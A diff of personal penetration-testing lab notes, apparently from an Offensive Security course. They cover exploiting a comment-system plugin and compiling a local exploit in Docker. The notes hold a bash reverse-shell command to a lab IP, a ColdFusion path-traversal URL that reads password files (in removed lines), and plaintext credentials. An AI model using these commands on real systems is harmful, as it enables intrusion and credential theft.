@@ -1,11 +1,36 @@
 ------------------
 NOTES
 ------------------
+Website has basic stuff
+comment section plugin
+	/internal
+	dig into the page source, i didnt read the exploit correctly :)
+	/internal/advanced_comment_system
+	many useful CVEs:wq
+	x.py needed to be updated with the correct ip and path
+		python x.py 'bash -c "bash -i >& /dev/tcp/192.168.119.179/80 0>&1"'
 
-http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
-https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
+	$ACS_CONFIG["db_password"] = "aCs2009offsec";
+
+	https://packetstormsecurity.com/files/165108/Advanced-Comment-System-1.0-Remote-Command-Execution.html
+
+	centOS 4.8
 
 
-AAFDC23870ECBCD3D557B6423A8982134E17927E:pass123
+	gpomg to kill myself
+	https://forums.offensive-security.com/showthread.php?48259-Fix-for-incompatibility-with-older-versions-of-gcc-Kali-2022-3&highlight=docker+guide ->  this works, but the STEP BY STEP GUIDE part only
 
-system shell after follwoing the writeup
+	Creating the docker container
+		 docker pull debian:10
+		 mkdir ~/docker_shared
+		 docker run --name debian10 -v ~/docker_shared:/media -it debian:10 /bin/bash
+		 docker start debian10
+		 docker exec -it debian10 /bin/bash
+		 apt update && apt install gcc-multilib build-essential
+
+	Compiling the exploits
+		wget the file into the shared directory
+		from docker:
+			gcc -Wall -Wll,--hash-type=both -m32 -o exploit exploit.c
+
+https://www.exploit-db.com/raw/9542
